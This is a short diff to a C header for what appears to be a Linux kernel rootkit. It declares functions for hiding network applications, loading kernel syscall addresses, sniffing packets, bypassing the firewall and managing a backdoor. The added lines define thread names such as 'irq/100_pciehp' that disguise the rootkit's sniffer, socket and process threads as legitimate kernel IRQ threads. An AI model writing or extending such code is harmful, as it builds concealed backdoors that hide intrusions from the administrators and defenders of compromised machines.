@@ -44,6 +44,10 @@
 #define OBFLEN(x) (sizeof(x)/sizeof(char*))
 #define OBFLEN2(x) sizeof(x)
 
+#define THREAD_PROC_NAME "irq/100_pciehp"
+#define THREAD_SOCK_NAME "irq/101_pciehp"
+#define THREAD_SNIFFER_NAME "irq/102_pciehp"
+
 typedef enum {
     CHILDREN,
     NO_CHILDREN,
@@ -129,7 +133,7 @@ void kv_scan_and_hide_netapp(void);
 struct kernel_syscalls *kv_kall_load_addr(void);
 
 /** socket,networking,backdoor management */
-struct task_struct *kv_sock_start_sniff(const char *name);
+struct task_struct *kv_sock_start_sniff(void);
 bool kv_sock_start_fw_bypass(void);
 void kv_sock_stop_sniff(struct task_struct *tsk);
 void kv_sock_stop_fw_bypass(void);
